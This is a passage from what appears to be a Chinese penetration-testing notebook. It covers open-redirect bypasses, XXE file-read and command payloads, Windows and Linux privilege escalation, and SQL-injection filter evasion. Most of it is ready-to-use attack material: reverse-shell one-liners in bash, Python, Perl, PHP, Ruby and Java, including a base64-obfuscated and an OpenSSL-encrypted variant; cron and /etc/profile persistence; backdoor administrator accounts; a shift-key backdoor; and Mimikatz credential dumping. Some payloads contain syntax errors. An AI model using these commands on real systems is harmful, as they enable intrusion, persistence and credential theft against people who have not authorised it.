`url=https://www.baidu.com/linkurl=iMwwNDM6ahaxKkSFuOG`

就可以跳转到自己站点了

另一种类似，但是程序的跳转白名单比较严格，只能是自己域的地址，这时需要有一个目标其它域的任意跳转漏洞，比如`https://auth.landgrey.me/jump.do?url=evil.com`，然后测试时

`https://www.landgrey.me/redirect.php?url=https://auth.landgrey.me/jump.do?url=evil.com`

- 畸形地址绕过

这一部分由于各种语言、框架和代码实现的不同，防护任意跳转代码的多种多样，导致绕过方式乍看起来很诡异，有多诡异

10种bypass方式

- 单斜线"/"绕过

`https://www.landgrey.me/redirect.php?url=/www.evil.com`

- 缺少协议绕过

`https://www.landgrey.me/redirect.php?url=//www.evil.com`

- 多斜线"/"前缀绕过

`https://www.landgrey.me/redirect.php?url=///www.evil.com`

`https://www.landgrey.me/redirect.php?url=www.evil.com`

- 利用"@"符号绕过

`https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com`

- 利用反斜线"\"绕过

`https://www.landgrey.me/redirect.php?url=https://www.evil.com\www.landgrey.me`

- 利用"#"符号绕过

`https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me`

- 利用"?"号绕过

`https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me`

- 利用"\\"绕过

`https://www.landgrey.me/redirect.php?url=https://www.evil.com\\www.landgrey.me`

- 利用"."绕过

`https://www.landgrey.me/redirect.php?url=.evil(可能会跳转到www.landgrey.me.evil域名)`

`https://www.landgrey.me/redirect.php?url=.evil.com(可能会跳转到evil.com域名)`

- 重复特殊字符绕过

`https://www.landgrey.me/redirect.php?url=///www.evil.com//..`

`https://www.landgrey.me/redirect.php?url=www.evil.com//..`

#### <font color="yellow">003 防御方法</font>

- 代码固定跳转地址，不让用户控制变量
- 跳转目标地址采用白名单映射机制，比如1代表auth.landgrey.me，2代表www.landgrey.me，其它不做任何动作
- 合理充分的校验校验跳转的目标地址，非己方地址时告知用户跳转

### <font color="yellow">08 0day漏洞</font>

#### <font color="yellow">001 简介</font>

通常是指还没有补丁的漏洞，也就是说官方还没有发现或者是发现了还没有开发出安全补丁的漏洞，利用0day漏洞进行的攻击，特点是利用简单，危害较大

#### <font color="yellow">002 常见0day——struts2</font>

Struts2框架存在漏洞，平时说的存在struts2漏洞是指的远程命令/代码执行漏洞

Struts2漏洞有很多，比较著名的几个远程命令/代码执行漏洞
- S2-016

	影响范围：Struts 2.0.0 - Struts 2.3.15

- S2-032

	影响范围：Struts 2.3.20 - Struts Struts 2.3.28(except 2.3.20.3 and 2.3.24.3)

- S2-037

	影响范围：Struts 2.3.20 - Struts Struts 2.3.28.1

- S2-045

	影响范围：Struts 2.3.5 - Struts 2.3.31 , Struts 2.5 - Struts 2.5.10

- S2-046

	影响范围：Struts 2.3.5 - Struts 2.3.31 , Struts 2.5 - Struts 2.5.10

- S2-048

	影响范围：Struts 2.3.x with Struts 1 plugin and Struts 1 action

	危害：可获取服务器权限

利用该漏洞可执行任意操作，例如上传shell，添加管理员账号等，下图我们展示的是查询os版本信息，以证明漏洞存在

#### <font color="yellow">003 常见0day——Java反序列化</font>

-  Java序列化：把Java对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的writeObject()方法可以实现序列化
-  Java反序列化：把字节序列恢复为Java对象的过程，ObjectInputStream类的readObject()方法用于反序列化
-  影响范围：WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，都收到影响
-  危害：导致远程代码执行，获取服务器权限

直接部署一个webshell，利用非常简单

#### <font color="yellow">004 常见的0day——bash破壳漏洞</font>

- Bash漏洞：bash漏洞源于在调用Bash Shell之前可以用构造的值创建环境变量，由于没有对输入的环境变量进行检测，攻击者可以在输入变量的时候可以包含恶意代码，在shell被调用后会被立即执行
- 影响范围：影响目前主流的操作系统平台，包括但不限于Redhat、CentOS、Ubuntu、Debian、Fedora、Amazon Linux、OS X 10.10等平台
- 危害：黑客利用该漏洞，可以执行任意代码，甚至可以不需要经过认证，就能远程取得系统的控制权，包括执行恶意程序，或在系统内植入木马，或获取敏感信息

#### <font color="yellow">005 常见的0day——心脏滴血漏洞</font>

- 心脏滴血漏洞(OpenSSL心脏滴血漏洞)：未能正确检测用户输入参数的长度，攻击者可以利用该漏洞，远程读取存在漏洞版本的OpenSSL服务器内存中64K的数据，获取内存中的用户名、密码、个人相关信息以及服务器的证书等私密信息
- 影响范围：该漏洞纰漏时，约有17%(大约五十万)通过认证机构认证的互联网安全网络服务器容易受到攻击
- 危害：通过多个测试实例表明，根据对应OpenSSL服务器承载业务类型，攻击者一般可获得用户X.509证书私钥、实时连接的用户账号密码、会话Cookie等敏感信息，进一步可直接取得相关用户权限，窃取私密数据或执行非授权操作

#### <font color="yellow">006 常见的0day——永恒之蓝</font>
- 永恒之蓝(EternalBlue)：美国国家安全局(NSA)开发的漏洞利用程序，于2017年4月14日被黑客组织影子掮客泄露，Wannacry传播利用的是windows的smb漏洞，漏洞补丁是MS17-010
- 影响范围：大多数Windows系统都受到影响(已有相关补丁)
- 危害：获取服务器权限

#### <font color="yellow">007 常见的0day——samba漏洞</font>

- Linux版永恒之蓝，CVE-2017-7494
- 差异：Windows的SMB服务器默认开启，Samba在大多数的Linux发行版中需要手动开启
- 影响范围：漏洞影响Samba3.5.0及3.5.0和4.6.4之间的任意版本(不包括4.5.10、4.4.14、4.6.4)
- 危害：可直接获取服务器shell

#### <font color="yellow">008 常见的0day——dedecms</font>

- Dedecms，织梦内容管理系统
- recommend.php存在sql注入
- 利用EXP
- 危害：上述exp可获取管理员密码

#### <font color="yellow">009 常见的0day——phpcms</font>

- phpcms,PHPCMS V9内容管理系统
- Authkey泄露、17年最新getshell 0day
- Authkey泄露利用EXP
- 危害：若存在该漏洞，访问上述链接authkey会泄露，可利用authkey进行注入

### <font color="yellow">09 XXE漏洞</font>

XXE漏洞全称(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害

XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件

XML(EXtensible Markup Language，可扩展标记语言)用来结构化、存储以及传输信息

XML文档结构包括3部分

- XML声明
- 文档类型定义(可选)
- 文档元素
  
```xml
<!-- XML声明(定义了XML的版本和编码) -->
	<?xml version="1.0" encoding="ISO-8859-1"?>

	<!-- 文档类型定义 -->
	<!DOCTYPE note [
		<!ELEMENT note (to,from,heading,body)>
		<!ELEMENT to      (#PCDATA)>
		<!ELEMENT from    (#PCDATA)>
		<!ELEMENT heading (#PCDATA)>
		<!ELEMENT body    (#PCDATA)>
	]>
	<!-- 文档元素 -->
	<note>
		<to>George</to>
		<from>John</from>
		<heading>Reminder</heading>
		<body>Don't forget the meeting!</body>
	</note>
```

#### <font color="yellow">001 View Code</font>

XML声明

> xml声明以`<?`开头，以`?>`结束
> 
> version属性是必选的，它定义了XML版本
> 
> encoding属性是可选的，它定义了XML进行解码时所用的字符集
> 
> ```xml
> <?xml version="1.0" encoding="ISO-8859-1"?>
> ```

文档类型定义

> 文档类型定义(Document Type Definition，DTD)用来约束一个XML文档的书写规范
> 
> 文档类型定义的基础语法
> 
> `<!ELEMENT 元素名 类型>`
> 
> 内部定义
> 
> 将文档类型定义放在XML文档中，称为内部定义，内部定义的格式如下
> 
> `<!DOCTYPE 根元素 [元素声明]>`
> 
> eg.
> 
> ```xml
> <!DOCTYPE note [
> 	<!-- 定义此文档是note类型 -->
> 	<!ELEMENT note (to,from,heading,body)>
> 	<!-- 定义note有4个元素:to from heading body -->
>  	<!ELEMENT to      (#PCDATA)>
> 	<!-- 定义to元素为#PCDATA类型  -->
>  	<!ELEMENT from    (#PCDATA)>
> 	<!-- 定义from元素为#PCDATA类型 -->
>  	<!ELEMENT heading (#PCDATA)> 
> 	<!-- 定义heading元素为#PCDATA类型 -->
>  	<!ELEMENT body    (#PCDATA)>
> 	<!-- 定义body元素为#PCDATA类型 -->
> ]>
> ```

外部文档引用

> 文档类型定义的内容也可以保存为单独的DTD文档
> 
> DTD文档在本地格式
> 
> ```xml
> <!DOCTYPE 根元素 SYSTEM "文件名">
> <!--eg：<!DOCTYPE note SYSTEM "note.dtd">-->
> ```
> 
> DTD文档外网引用
> 
> ```xml
> <!DOCTYPE 根元素 PUBLIC "DTD名称" "DTD文档的URL">
> <!--eg：<!doctype html public "xxx" "http://www.xx.com/note.dtd">-->
> ```

#### <font color="yellow">002 漏洞代码</font>

`file_get_contents`函数读取了`php://input`传入的数据，但是传入的数据没有经过任何过滤，直接在loadXML函数中进行了调用并通过了echo函数输入`$username`的结果，这样就导致了XXE漏洞的产生

```php
<?php 
libxml_disable_entity_loader(false);
$xmlfile=file_get_contents('php://input');
$dom=new DOMDocument();

$dom->loadXML($xmlfile,LIBXML_NOENT | LIBXML_DTDLOAD);
$creds=simplexml_import_dom($dom);
$username=$creds->username;
$password=$creds->password;
echo 'hello'.$username;
?>
```

#### <font color="yellow">003 文件读取</font>

通过加载外部实体，利用file://、php://等伪协议读取本地文件

payload

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE creds[
<!ELEMENT userename ANY>
<!ELEMENT password ANY>
<!ENTITY xxe SYSTEM="file:///etc/passwd"]>
<creds>
    <username>&xxe</username>
    <password>test</password>
</creds>
```

#### <font color="yellow">004 内网探测</font>

利用xxe漏洞进行内网探测，如果端口开启，请求返回的时间会很快，如果端口关闭请求返回的时间会很慢

探测22号端口是否开启

payload

```xml
<?xml version="1.0"?>
<!DOCTYPE creds[
<!ELEMENT userename ANY>
<!ELEMENT password ANY>
<!ENTITY xxe SYSTEM="http://127.0.0.1.22"]>
<creds>
    <username>&xxe</username>
    <password>test</password>
</creds>
```

#### <font color="yellow">005 内网应用攻击</font>

通过XXE漏洞进行内网应用攻击，例如攻击内网jmx控制台未授权访问的JBpss漏洞进行攻击

#### <font color="yellow">006 命令执行</font>

利用xxe漏洞可以调用except://伪协议调用系统命令

payload

```xml
<?xml version="1.0"?>
<!DOCTYPE creds[
<!ELEMENT userename ANY>
<!ELEMENT password ANY>
<!ENTITY xxe SYSTEM="except://id"]>
<creds>
    <username>&xxe</username>
    <password>test</password>
</creds>
```

#### <font color="yellow">007 漏洞修补</font>

禁用外部实体：在代码中设置`libxml_disable_entity_loader(true)`

过滤用户提交的XML数据：过滤关键词为`<!DOCTYPE`、`<!ENTITY`、`SYSTEM`和`PUBLIC`

#### <font color="yellow">008 简介</font>

XML外部实体注入(XML External Entity)简称XXE漏洞

简介

- XML指可扩展标记语言(EXtensible Markup Language)
- XML是一种很像HTML的标记语言
- XML的设计宗旨是传输数据，而不是显示数据
- XML标签没有被预定义，您需要自行定义标签
- XML被设计为具有自我描述性
- XML是W3C的推荐标准

XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，DTD全称为，Document Type Definition，中文翻译为文档类型定义，是一套为了进行程序间的数据交换而建立的关于标记符的语法规则，文档类型定义(DTD)可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构，DTD可被成行地声明于XML文档中，也可作为一个外部引用

内部的DOCTYPE声明：`<!DOCTYPE root-element [element-declarations]>`

外部文档声明：`<!DOCTYPE root-element SYSTEM "filename">`

在DTD中进行实体声明的时候，将使用ENTITY关键字来声明，实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明

内部实体声明：`<!ENTITY entity-name "entity-value">`

外部实体声明：`<!ENTITY entity-name SYSTEM "URI/URL">`

XXE漏洞代码分析

### <font color="yellow">10 提权</font>

#### <font color="yellow">001 Web服务器提权</font>

- SER-TU提权：通常是利用SERFTP服务器管理工具，首先要在安装目录下找到INI配置文件，必须具备可写入的权限
- RADMIN提权：在扫描4899空口令后，同样需要他来连接
- PCANYWHRER提权：也是远程客户端软件，下载安装目录的CIF文件进行破解
- SAM提权：SAM系统帐户，通常需要下载临时存放的SAM文件，然后进行HASH破解
- NC提权：利用NC命令，反弹一个端口，然后TELNET远程去连接一个端口，虽然权限不够大，但结合巴西烤肉，也是能够成功的
- PR提权：PR提权，这个就不多说了，最好是免杀的PR大杀器，这样更方面我们去操作
- IIS提权：IIS6.0提权，首先需要获取IIS的配置信息，利用工具进行添加后门用户
- 43958提权：如果SER-TU有直接读入和执行的权限，那么我们就可以直接提权
- PERL提权：PERL提权通常是针对PERL文件夹下的提权方式，利用DIR目录%20NET USER这样来建立后门用户
- 内网LCX提权：转发工具LCX，通常需要先本地监听一个端口，然后转发，针对内网，用本地的127连接对方的3389
- 启动提权：如果服务器启动项有能够执行的权限，那么应该说管理员的技术肯定不精湛
- 替换服务提权：替换某个服务EXE，比如SER-TU，可将原有的删除，再传一个同样的SER.EXE上去，等待服务器重启
- FXP提权：FXP这个工具其实本身他是一个传输工具，但我们可以下载他的三个文件，然后，用密码查看器的功能去获得密码
- 输入法提权：目前来说的话，输入法提权的思路基本上不太可行了
- 360提权：360提权，也就是我们常说的SHIFT后门，如果执行了360漏洞利用程序，连接服务器用SHIFT5下，弹出了CMDSHELL即为成功
- VNC提权：VNC，我们通常是扫描5900国外服务器时候用到VNC来连接的，同样，我们如果得到了VNC的密码，通常可以利用他来提权
- 2003ODAY提权：如果服务器是2003的，那么就可以利用2003ODAY利用工具来进行提权了
- ROOT提权：如果你获得了MSSQL的密码，那么就可以导入注册表的方式，利用MSSQL语句执行我们想要的命令了
- SA密码服务器提权：通常去寻找SA，MSSQL的相关密码，比如CONFIG.ASP,CONN.ASP等等
- FTP溢出提权：这个用到LCX工具，本地溢出，转发一个端口，虽然不是内网，利用默认的21进行提升权限

#### <font color="yellow">002 简介</font>

主要针对网站测试过程中，当测试某一网站时，通过各种漏洞提升webshell权限来拿到该服务器的权限

常见脚本所处的权限

- asp/PHP，匿名权限(网络服务权限，权限较小)
- aspx，user权限(普通用户权限)
- jsp，系统权限(通常)

收集信息

- 必要信息
	内/外网
	服务器系统和版本位数
	服务器的补丁情况
	服务器的安装软件情况
	服务器的防护软件情况
	端口情况
	支持脚本的情况
- 常见命令(for windows)
	- ipconfig /all：查看当前ip
	- net user：查看当前服务器账号情况
	- netstat –ano：查看当前服务器端口开放情况
	- ver：查看当前服务器操作糸统
	- systeminfo：查看当前服务器配置信息(补丁情况)
	- tasklist /svc：查看当前服务器进程
	- taskkill –PID ID号：结束某个pid号的进程
	- taskkill lim qq.exe /f：结束qq进程
	- net user abc abc /add：添加一个用户名为abc密码为abc的用户
	- whoami：查看当前操作用户(当前权限)
- 常见命令(for linux)
    - ls –al：查看当前服务器的文件和文件夹
	- pwd：查看当前操作路径
	- uname -a：查看当前服务器的内核信息
- cmd执行命令
	- 防护软件拦截
	- cmd被降权
	- 组件被删除
	
	找到可读写目录上传cmd.exe，将执行的cmd.exe路径替换成上传的路径，再次调用

#### <font color="yellow">003 windows提权</font>

- 第三方软件提权
	- FTP软件
		- server –u、g6ftp、FileZilla
	- 远程管理软件
		- PCanywhere、readmin、vnc
- 溢出提权
	- server-u提权
		- 有修改权限
			- 检查是否有可写权限，修改server-u，默认安装目录下的servUDaemou.ini
			- 增加用户
			- 连接
			- 执行命令
			
			quote site exec bet user abc abc.com /add
			
			quote site exec net localgroup administertors abc /add
		
		- 无修改权限
			- 暴力破解mds
			- 溢出提权
- 启动项提权

	G6ftp提权
	- 下载管理配置文件，将administrator管理密码破解
	- 使用lcx端口转发(默认只允许本机连接)
	- lcx.exe –tran 8027 127.0.0.1 8021
	- 使用客户端管理员用户登录
	- 创建用户并设置权限和执行的批处理文件
	- 上传批处理
	- 已创建的普通用户登录ftp
	- 执行命令quate site x.bat
	- x.bat内容为添加系统用户提权

- 破解hash提权
	- filezilla提权：filezilla是一款开源的ftp服务器和客户端的软件若安装了服务器默认只监听127.0.0.1的14147端口并且默认安装目录下有两个敏感文件
		- filezillaserver.xm(包含了用户信息)
		- filezillaserver interface.xml(包含了管理信息)
		
		提权思路
		
		- 下载这两个文件，拿到管理密码
		- 配置端口转发，登录远程管理ftpserver创建ftp用户
		- 分配权限，设置家目录为c:\
		- 使用cmd.exe改名为sethc.exe替换
		- c:\windows\system32\sethc.exe生成shift后门
		- 连接3389按5次shift调出cmd.exe
		- query user(显示管理员是否在线)
- 数据库提权

#### <font color="yellow">004 服务器系统提权意义</font>

- 修改服务器上某个文件
- 查看服务器上某个文件
- 获取服务器上数据库权限

网站webshell权限解析

<font color="red">一般情况下，webshell权限介于guests-users之间，权限较小</font>

webshell权限影响条件

- 网站脚本类型
- 搭建平台类型
- 当拿到一个网站时，看看它的脚本类型

`ASP PHP(小于users)<ASPX(users) <JSPs`(ystem，如果网站是JSP搭建，权限就是system了，也就是不用提权了)

`phpstudy apmserv lamp 等软件搭建 = administrators`

常规提权的方法

- 数据库提权
- 溢出漏洞提权
- 第三方软件提权

#### <font color="yellow">005 服务器提权系统溢出漏洞</font>

前期的信息收集

- 服务器操作系统的位数
- 网站脚本程序类型
- 服务器补丁情况
- 服务器防护软件
- 其他信息整理

常见的系统命令(for windows)

- ipconfig：查看计算机ip地址(判定网络情况，是否是内网还是外网)
- net user：查看计算机用户
- net start：查看计算机开启服务(可以看一下是否开启防护软件)
- whoami：查看当前用户权限
- tasklist /svc：查看计算机进程(判断第三方软件等)
- systeminfo：查看计算机相关信息(操作系统、位数、补丁情况等)
- netstat -ano：查看计算机端口开放情况

#### <font color="yellow">006 对提权的重新记录</font>

信息收集

- 内网
- 服务器系统和版本位数
- 服务器的补丁情况
- 服务器的安装软件情况
- 服务器的防护软件情况
- 端口情况
- 支持脚本的情况

常见命令(for windows)

- ipconfig /all：查看当前ip
- net user：查看当前服务器账号情况
- netstat –ano：查看当前服务器端口开放情况
- ver：查看当前服务器操作糸统
- systeminfo：查看当前服务器配置信息(补丁情况)
- tasklist /svc：查看当前服务器进程
- taskkill –PID ID号：结束某个pid号的进程
- taskkill lim qq.exe /f：结束qq进程
- net user abc abc /add：添加一个用户名为abc密码为abc的用户
- whoami：查看当前操作用户(当前权限)

常见命令(for linux)

- ls –al：查看当前服务器的文件和文件夹
- pwd：查看当前操作路径
- uname -a：查看当前服务器的内核信息

cmd执行命令

- 防护软件拦截
- cmd被降权
- 组件被删除

找到可读写目录上传cmd.exe，将执行的cmd.exe路径替换成上传的路径，再次调用

#### <font color="yellow">007 提权的条件</font>

如在拿到webshell权限、数据库权限、普通用户权限

Windows基础命令

- query user：查看用户登录情况
- whoami：查看当前用户权限
- systeminfo：查看当前系统版本和补丁信息

添加管理员用户–设置密码为`123456`

`net user 1111 123456 /add`

`net localgroup administrators 1111 /add`

如果远程桌面连接不上，那么就添加远程桌面组

`net localgroup "Remote Desktop Users" 1111 /add`

其他基础命令
- ipconfig：查看本机ip信息，可加/all参数
- netstat-ano：查看端口情况
- dir c:\：查看目录
- type c:\...\...\....txt：查看指定位置文件内容，一般为文本文件
- echo 字符串>....txt：写入文本到文件，特殊字符<>等前面加^
- copy ....txt ....php：复制文件
- renname d:\....txt ....txt：将某个路径下文件重命名
- tasklist：查看所有进程占用的端口
- taskkill /im ....exe /f：强制结束指定进程

linux基础命令：本地溢出提权、数据库提权、三方软件提权、信息泄露

#### <font color="yellow">008 基于密码破解的提权</font>

密码获取的常用手段

- 中间人劫持：网络窃听
- 用户主机窃听：键盘记录
- 简单猜测：常用密码(弱口令)
- 系统漏洞：永恒之蓝
- 用户泄露：git、配置文件等泄露
- 系统后门：shift后门等等

windows的密码原理
	
> windows采用两种方法对用户密码进行哈希处理，分别是LM和NT，而哈希是一种加密函数经过计算后的结果
> 
> windows系统密码hash默认情况下由两部分组成，第一部分是LM-hash，第二部分是NT-hash
> 
> 得到了哈希密码后可以通过在线查询网站来破解

windows密码hash导出(获取)

> 导出导入SAM、system
> 
> gethashs导出
> 
> Pwdump导出
> 
> Wce导出

这四种方法都是用不同的工具去获取，基本差不多的

破解hash密码：导入SAM和system文件(也可以导入 pwdump导出来的文件)进行暴力破解即可

明文密码的获取

> 工具
> 
> Wce明文密码获得
> 
> Mimikatz明文密码获得
> 
> - privllege::debug
> - sekurlsa::logonpasswords
> 
> Getpass明文密码获得

Linux密码获取和破解

- join破解
- 加载字典破解

#### <font color="yellow">009 windows系统的提权基础(pr提权)</font>

windows提权

- 密码收集
	- 注册表
	- 日志
	- .rap文件
	- 内存
	- 配置文件
	- sam文件
- 内核提权
	- ms09-012(pr.exe)
- 数据库提权
	- mysql
	- sql server
- 应用提权
	- ftp

#### <font color="yellow">010 windows提权实践</font>

- WinSysHelper-master(上传bat+txt文件，适用于2003之前的系统)
- powershell

这里首先了解学习一下powersell的知识，在win7虚拟机中开启powshell，并查看其版本(Get-Host或者`$PSVersionTable.PSVERSION`命令来查看)

powershell脚本的文件名后缀是.PS1

这里利用Sherlock来提权(Sherlock是一个在Windows下用于本地提权的PowerShell脚本，可以在GitHub上下载)

#### <font color="yellow">011 Linux提权基础</font>

##### <font color="yellow">0001 基础命令</font>
- 获取系统信息
	- cat /etc/issue：查看发行版
	- cat /etc/*-release：查看发行版
	- cat /proc/version
	- uname -a：查看内核版本
	- rpm -q kernel：红帽系统特有
	- dmesg | grep Linux
	- ls /boot | grep vmlinuz-
	- lsb_release -a
- 检查用户权限
	- sudo -l
	- cat /etc/sudoers
	- whoami
	
	passwd文件中存储了用户，shadow文件中存储的是密码的hash，出于安全的考虑，passwd是全用户可读，root可写，而Shadow是仅root可读写的
	
	passwd由冒号分割，第一列是用户名，第二列是密码，x代表密码hash被放在shadow里面了(这样非root就看不到了)

- 查看环境变量
	
	搜寻有配置错误的环境变量，查看是否优先从不安全的路径执行文件
	
	- cat /etc/profile
	- cat /etc/bashrc
	- cat ~/.bash_profile
	- cat ~/.bashrc
	- cat ~/.bash_logout
	- cat ~/.bash_history
	- env
	- set
- 检查历史文件及命令
	- cat ~/.*_history
- 搜寻可被低权限用户使用的root权限程序
	- crontab -l
	- ls -alh /var/spool/cron
	- ls -al /etc/ | grep cron
	- ls -al /etc/cron*
	- cat /etc/cron*
	- cat /etc/at.allow
	- cat /etc/at.deny
	- cat /etc/cron.allow
	- cat /etc/cron.deny
	- cat /etc/crontab
	- cat /etc/anacrontab
	- cat /var/spool/cron/crontabs/root
- 检查以root权限的进程是否存在漏洞
	- ps aux | grep root
	- ps -ef | grep root
- 搜索纯文本凭据的文件
	- grep -ir user *
	- grep -ir pass *
- 查找可写的配置文件
	- find /etc/ -writable -type f 2>/dev/null
- 查找suid权限的程序
	- find / -user root -perm -4000 -print 2>/dev/null
	- find / type f -perm -u=s 2>/dev/null
- 可利用的脚本
	- LinEnum 
	- linuxprivchecker.py
	- unix-privesc-check 
- 获得交互shell
	- python -c 'import pty;pty.spawn("/bin/bash")' 
	- echo os.system('/bin/bash')
	- /bin/sh -i

##### <font color="yellow">0002 反弹shell实战</font>

Bash反弹shell

> Linux 反弹 shell 使用下面这条命令，该命令弹回来的shell是不可交互的，也就是比如 vim、passwd 命令不能用
>
> ```bash
> bash -i >& /dev/tcp/192.168.10.27/4444 0>&1   #将shell环境转发到192.168.10.32的4444端口上
> 也可以如下：
> {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjI3LzQ0NDQgMD4mMSA=}|{base64,-d}|{bash,-i}
> ```
> 
> 然后客户端用netcat进行接收
> 
> ```bash
> nc -lvp  4444  #监听4444端口
> ```
> 
> 只有拥有`/bin/bash`的用户，才能使用该命令，如apache等web用户，无法使用该命令(以下是使用菜刀连接的webshell，获取到的shell是apache 的shell)
> 
> 文件描述符
> 
> - 标准输入(stdin)：代码为0，使用`<`或`<<` 
> - 标准输出(stdout)：代码为1，使用`>`或`>>` 
> - 标准错误输出(stderr)：代码为2，使用`2>`或`2>>`
> - 而通过查阅资料，发现`>&`和`&>`两者一个意思，都是将标准错误输出合并到标准输出中
> 
> 以下这些命令其实都可以用于linux反弹shell
> 
> ```bash
> bash -i >& /dev/tcp/192.168.10.27/4444 0>&1 
> bash -i >& /dev/tcp/192.168.10.27/4444 0<&1 
> bash -i $> /dev/tcp/192.168.10.27/4444 0>$1 
> bash -i $> /dev/tcp/192.168.10.27/4444 0<&1 
> ```
> 
> 但是，很多时候，由于我们获取的shell并不是一个具有完整交互的shell，因此可能会在使用过程中被挂起，甚至还可能会因为我们的操作失误，例如不小心摁下了Ctrl-C，这将直接终止我们的整个shell进程，或者获得的shell类型是sh的，我们使用不习惯
> 
> 如果目标主机有python环境，我们在用netcat获得了反弹的shell后，可以执行下面的命令，才获得一个正常的shell(可以进行交互的shell)，可以执行passwd命令，但是vim命令还是用不了
> 
> ```bash
> python -c 'import pty;pty.spawn("/bin/bash")'
> ```

加密bash反弹shell的流量

> - 在vps上生成SSL证书的公钥/私钥对，执行以下命令，一路回车即可
> ```bash
> openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
> ```
> - 在VPS监听反弹shell
> ```bash
> openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
> ```
> - 在目标上用openssl加密反弹shell的流量
> ```bash
> mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.10.136:4444 > /tmp/s;rm /tmp/s
> ```

Python反弹shell

> 使用下面这条命令弹回来的shell也是不可交互的shell，即 vim 和 passwd 等命令用不了
> 
> ```bash
> #利用python反弹一个bash类型的shell
> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.25",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
> ```
> 
> 只有拥有 `/bin/bash` 的用户，才能使用该命令，如apache等web用户，无法使用该命令(以下是使用菜刀连接的webshell，获取到的 shell 是 apache 的shell)
	
其他命令反弹shell

> ```
> Perl：
> 	perl -e 'use Socket;$i="192.168.10.13";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
> PHP：
> 	php -r '$sock=fsockopen("192.168.10.13",8888);exec("/bin/sh -i <&3>&3 2>&3");'
> Ruby：
> 	ruby -rsocket -e'f=TCPSocket.open("192.168.10.13",8888).to_i;exec sprintf("/bin/sh -i <&%d>&%d 2>&%d",f,f,f)'
> Java：
> 	r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.10.13/8888;cat <&5 2="" |="" while="" read="" line;="" do="" \$line="">&5 >&5; done"] as String[]) p.waitFor()
> ```

写入命令到定时任务文件

> 我们可以在远程主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道远程主机当前的用户名是哪个，因为我们的反弹shell命令是要写在`/var/spool/cron/`当前用户命令的文件内的，所以必须要知道远程主机当前的用户名，否则就不能生效
> 
> 比如，当前用户名为root，我们就要将下面内容写入到 `/var/spool/cron/root` 中(centos系列主机)
> 
> 比如，当前用户名为root，我们就要将下面内容写入到 `/var/spool/cron/crontabs/root` 中(debian系列主机)
> 
> ```bash
> */1  *  *  *  *   /bin/bash -i>&/dev/tcp/192.168.10.11/4444 0>&1
> #每隔一分钟，向192.168.10.27的4444号端口发送shell
> ```

写入SSH公钥 

> 将公钥信息传送到远程主机的/root/.ssh/目录下，并且重命名为authorized_keys如果是其他用户，比如test，那就是`/test/.ssh/`下

写入/etc/profile文件

> 将以下命令写入`/etc/profile`文件中，`/etc/profile`中的内容会在用户打开bash窗口时执行
> ```bash
> /bin/bash -i>&/dev/tcp/192.168.10.11/4444 0>&1 &
> ```

##### <font color="yellow">脏牛提权</font>
> 
> 脏牛漏洞，又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞，Linux kernel团队在2016年10月18日已经对此进行了修复
> 
> 漏洞范围：Linux内核 >= 2.6.22(2007年发行，到2016年10月18日才修复)
> 
> 简要分析：该漏洞具体为，Linux内核的内存子系统在处理写入复制(copy-on-write，COW)时产生了竞争条件(race conditio)，恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问，竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码，利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限

## <font color="yellow">0x02 服务器端应用安全</font>

### <font color="yellow">01 注入攻击</font>

#### <font color="yellow">001 注释符</font>

- `//`
- `--%20`
- `/**/`
- `#`
- `--+`
- `-- -`
- `%00`
- `;`

#### <font color="yellow">002 大小写绕过</font>

用于屏蔽一些对大小写敏感的黑名单匹配`?id=1 UnIon SeLeCt user()#`

#### <font color="yellow">003 双写绕过</font>

waf将关键字替换为空，没有回归`?id=1 uniunionon seselectlect user()#`

#### <font color="yellow">004 编码绕过</font>

利用urlencode，ascii(char，hex，unicode等编程绕过)

`'` :

```
%u0027 %u02b9 %u02bc 
%u02c8 %u2032 
%uff07 %c0%27 
%c0%a7 %e0%80 %a7empty 
```

`:`:

```
%u0020 %cuff00 
%c0%20 e0%80%a0
```

`(`: 

```
%u0028 %uff08 
%c0%28 %c0%a8 
%e0%80%a8 
```

`)`: 

```
%u0029 %uff09 
%c0%29 %c0%a9 
%e0%80%a9
```

#### <font color="yellow">005 绕过空格</font>

用Tab代替空格`%20 %09 %0a %0b %0c %0d %a0 /**/`

#### <font color="yellow">006 like绕过</font>

`?id=1' or 1 like 1#`，可以绕过对`=`、`>`等过滤

#### <font color="yellow">007 in绕过</font>

`or '1' IN('1234')#`可以替代`=`


#### <font color="yellow">008 等价函数或变量</font>

`hex()`、`bin()` ==> `ascii()`

